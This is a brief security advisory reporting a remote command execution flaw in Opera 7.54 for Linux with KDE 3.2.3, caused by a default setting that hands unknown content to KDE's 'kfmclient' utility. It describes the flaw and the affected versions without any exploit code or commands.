It is reported that Opera for Linux is susceptible to a remote command execution vulnerability. This issue is due to a default configuration setting in Opera that utilizes the KDE 'kfmclient' utility to open unknown content.

Exploitation of this issue allows attacker-supplied commands to be executed in the context of the user running Opera.

Version 7.54 of Opera for Linux with KDE version 3.2.3 is reported vulnerable to this issue. Other versions may also be affected.
